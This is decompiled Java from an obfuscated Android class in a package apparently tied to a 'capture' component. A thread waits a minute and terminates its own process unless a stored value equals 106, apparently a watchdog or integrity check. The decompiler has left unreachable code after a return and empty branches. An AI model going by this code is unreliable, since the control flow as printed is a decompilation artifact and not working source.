package com.vvt.capture.a;

import android.os.Process;
import android.os.SystemClock;

class f
  extends Thread
{
  f(e parame) {}
  
  public void run()
  {
    long l = 60000L;
    SystemClock.sleep(l);
    Object localObject = e.a(this.a);
    if (localObject == null)
    {
      boolean bool1 = e.c();
      if (bool1) {}
      int i = Process.myPid();
      Process.killProcess(i);
    }
    for (;;)
    {
      return;
      localObject = e.a(this.a);
      boolean bool2 = localObject instanceof String;
      int j;
      if (bool2)
      {
        bool2 = e.c();
        if (bool2) {}
        j = Process.myPid();
        Process.killProcess(j);
      }
      else
      {
        localObject = (Integer)e.a(this.a);
        j = ((Integer)localObject).intValue();
        int m = 106;
        if (j != m)
        {
          boolean bool3 = e.c();
          if (bool3) {}
          int k = Process.myPid();
          Process.killProcess(k);
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/a/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */